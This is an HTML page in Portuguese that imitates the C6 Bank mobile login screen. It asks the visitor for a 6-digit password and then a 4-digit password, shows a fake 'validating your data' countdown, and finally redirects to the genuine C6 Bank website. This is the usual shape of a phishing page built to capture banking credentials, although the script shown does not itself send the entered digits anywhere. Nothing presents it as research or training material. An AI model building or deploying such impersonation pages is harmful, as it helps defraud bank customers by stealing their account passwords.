<!DOCTYPE html>
<html lang="pt-BR">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>C6 Bank</title>
    <style>
        @font-face {
            font-family: 'Proxima Nova';
            font-weight: 300;
            font-display: swap;
            font-style: normal;
            src: url(https://http2.mlstatic.com/ui/webfonts/v3.0.0/proxima-nova/proximanova-light.woff2) format("woff2"),
                url(https://http2.mlstatic.com/ui/webfonts/v3.0.0/proxima-nova/proximanova-light.woff) format("woff"),
                url(https://http2.mlstatic.com/ui/webfonts/v3.0.0/proxima-nova/proximanova-light.ttf) format("truetype");
        }

        @font-face {
            font-family: 'Proxima Nova';
            font-weight: 400;
            font-display: swap;
            font-style: normal;
            src: url(https://http2.mlstatic.com/ui/webfonts/v3.0.0/proxima-nova/proximanova-regular.woff2) format("woff2"),
                url(https://http2.mlstatic.com/ui/webfonts/v3.0.0/proxima-nova/proximanova-regular.woff) format("woff"),
                url(https://http2.mlstatic.com/ui/webfonts/v3.0.0/proxima-nova/proximanova-regular.ttf) format("truetype");
        }

        @font-face {
            font-family: 'Proxima Nova';
            font-weight: 600;
            font-display: swap;
            font-style: normal;
            src: url(https://http2.mlstatic.com/ui/webfonts/v3.0.0/proxima-nova/proximanova-semibold.woff2) format("woff2"),
                url(https://http2.mlstatic.com/ui/webfonts/v3.0.0/proxima-nova/proximanova-semibold.woff) format("woff"),
                url(https://http2.mlstatic.com/ui/webfonts/v3.0.0/proxima-nova/proximanova-semibold.ttf) format("truetype");
        }

        :root {
            --sheet: #2a2a2a;
            --sheet-2: #3a3a3a;
            --line: #5a5a5a;
            --muted: #b8b8b8;
            --gold: #d6a92e;
            --gold-thumb: #f5cf3e;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            -webkit-tap-highlight-color: transparent;
        }

        html,
        body {
            height: 100%;
        }

        body {
            font-family: 'Proxima Nova', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background: #000;
            color: #fff;
            -webkit-font-smoothing: antialiased;
        }

        .phone {
            width: 100%;
            max-width: 430px;
            min-height: 100dvh;
            margin: 0 auto;
            position: relative;
            background: #000 url('tema.jpeg') center top / cover no-repeat;
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }

        /* ===== BOTTOM SHEET ===== */
        .sheet {
            margin-top: auto;
            background: var(--sheet);
            border-top-left-radius: 22px;
            border-top-right-radius: 22px;
            padding: 28px 26px max(28px, env(safe-area-inset-bottom));
            display: flex;
            flex-direction: column;
            min-height: 52vh;
            position: relative;
            z-index: 2;
        }

        .sheet-title {
            font-size: clamp(26px, 7vw, 30px);
            font-weight: 400;
            color: #fff;
            line-height: 1.2;
            margin-bottom: 22px;
            letter-spacing: -0.2px;
        }

        /* ===== INPUT ===== */
        .input-wrap {
            margin-bottom: 12px;
        }

        .pass-input {
            width: 100%;
            background: transparent;
            border: none;
            border-bottom: 1px solid var(--line);
            color: #fff;
            font-size: clamp(24px, 7vw, 30px);
            font-family: inherit;
            font-weight: 400;
            padding: 10px 0 14px;
            letter-spacing: 14px;
            outline: none;
            transition: border-color .15s;
        }

        .pass-input:focus {
            border-bottom-color: #fff;
        }

        .pass-input::placeholder {
            color: #6a6a6a;
            letter-spacing: 0;
        }

        .hint {
            color: var(--muted);
            font-size: 13px;
            font-weight: 400;
            margin-top: 6px;
        }

        .spacer {
            flex: 1;
            min-height: 24px;
        }

        /* ===== TOGGLE ROW ===== */
        .toggle-row {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 14px 0 22px;
        }

        .toggle-label {
            color: #fff;
            font-size: 16px;
            font-weight: 600;
        }

        .switch {
            position: relative;
            width: 52px;
            height: 30px;
            background: #4a4a4a;
            border-radius: 999px;
            cursor: pointer;
            transition: background .2s;
            flex-shrink: 0;
            border: none;
            padding: 0;
        }

        .switch.on {
            background: var(--gold);
        }

        .switch-thumb {
            position: absolute;
            top: 3px;
            left: 3px;
            width: 24px;
            height: 24px;
            background: #8a8a8a;
            border-radius: 50%;
            transition: transform .2s, background .2s;
        }

        .switch.on .switch-thumb {
            transform: translateX(22px);
            background: var(--gold-thumb);
        }

        /* ===== BUTTON ===== */
        .btn-entrar {
            width: 100%;
            background: var(--sheet-2);
            color: rgba(255, 255, 255, 0.55);
            border: none;
            padding: 18px;
            border-radius: 14px;
            font-size: 17px;
            font-family: inherit;
            font-weight: 400;
            cursor: pointer;
            transition: background .15s, color .15s, transform .08s;
        }

        .btn-entrar.is-ready {
            background: #fff;
            color: #1a1a1a;
            font-weight: 600;
        }

        .btn-entrar.is-ready:hover {
            background: #f0f0f0;
        }

        .btn-entrar:active {
            transform: scale(0.99);
        }

        /* ===== LOADER OVERLAY ===== */
        .loader {
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, 0.92);
            display: none;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            z-index: 9999;
        }

        .loader.is-active {
            display: flex;
        }

        .loader-ring {
            position: relative;
            width: 110px;
            height: 110px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
        }

        .loader-spinner {
            position: absolute;
            inset: 0;
            border: 4px solid rgba(255, 255, 255, 0.12);
            border-top-color: var(--gold-thumb);
            border-radius: 50%;
            animation: loaderSpin .8s linear infinite;
        }

        .loader-count {
            position: relative;
            font-size: 38px;
            font-weight: 600;
            color: #fff;
            font-variant-numeric: tabular-nums;
            line-height: 1;
        }

        .loader-text {
            margin-top: 20px;
            font-size: 15px;
            color: var(--muted);
            font-weight: 400;
        }

        @keyframes loaderSpin {
            to {
                transform: rotate(360deg);
            }
        }

        @media (min-width: 480px) {
            body {
                background: #2e2e2e;
            }

            .phone {
                box-shadow: 0 0 40px rgba(0, 0, 0, 0.5);
            }
        }
    </style>
</head>

<body>
    <div class="phone">

        <!-- Bottom sheet -->
        <div class="sheet">
            <h1 class="sheet-title" id="step-title">Digite sua senha de 6 dígitos</h1>

            <div class="input-wrap">
                <input id="senha" class="pass-input" type="text" inputmode="numeric" autocomplete="off" maxlength="6"
                    aria-label="Senha">
                <div class="hint" id="hint">0 de 6 dígitos</div>
            </div>

            <div class="spacer"></div>

            <div class="toggle-row">
                <span class="toggle-label" id="toggle-label">Lembrar senha</span>
                <button type="button" class="switch on" id="remember" aria-pressed="true" aria-label="Lembrar senha">
                    <span class="switch-thumb"></span>
                </button>
            </div>

            <button type="button" class="btn-entrar" id="btn-entrar">Entrar</button>
        </div>
    </div>

    <!-- Loader overlay -->
    <div class="loader" id="loader" role="status" aria-live="polite">
        <div class="loader-ring">
            <div class="loader-spinner"></div>
            <div class="loader-count" id="loader-count">5</div>
        </div>
        <div class="loader-text">Validando seus dados…</div>
    </div>

    <script>
        (function () {
            const input = document.getElementById('senha');
            const title = document.getElementById('step-title');
            const hint = document.getElementById('hint');
            const btn = document.getElementById('btn-entrar');
            const loader = document.getElementById('loader');
            const countEl = document.getElementById('loader-count');
            const remember = document.getElementById('remember');

            let step = 1; // 1 = senha 6 dígitos, 2 = senha 4 dígitos

            // Toggle "Lembrar senha"
            remember.addEventListener('click', () => {
                const isOn = remember.classList.toggle('on');
                remember.setAttribute('aria-pressed', isOn ? 'true' : 'false');
            });

            // Apenas dígitos
            input.addEventListener('input', () => {
                input.value = input.value.replace(/\D+/g, '');
                updateHint();
            });

            input.addEventListener('keydown', (e) => {
                if (e.key === 'Enter') { e.preventDefault(); handleSubmit(); }
            });

            btn.addEventListener('click', handleSubmit);

            function expectedLen() { return step === 1 ? 6 : 4; }

            function updateHint() {
                const len = input.value.length;
                const need = expectedLen();
                hint.textContent = `${len} de ${need} dígitos`;
                btn.classList.toggle('is-ready', len === need);
            }

            function handleSubmit() {
                if (input.value.length !== expectedLen()) { input.focus(); return; }

                if (step === 1) {
                    step = 2;
                    title.textContent = 'Agora digite sua senha de 4 dígitos';
                    input.value = '';
                    input.maxLength = 4;
                    updateHint();
                    input.focus();
                    return;
                }

                startLoader();
            }

            function startLoader() {
                loader.classList.add('is-active');
                input.blur();
                let remaining = 5;
                countEl.textContent = remaining;
                const tick = setInterval(() => {
                    remaining--;
                    if (remaining <= 0) {
                        clearInterval(tick);
                        countEl.textContent = '0';
                        window.location.href = 'https://www.c6bank.com.br/';
                        return;
                    }
                    countEl.textContent = remaining;
                }, 1000);
            }

            updateHint();
            setTimeout(() => input.focus(), 200);
        })();
    </script>
</body>

</html>
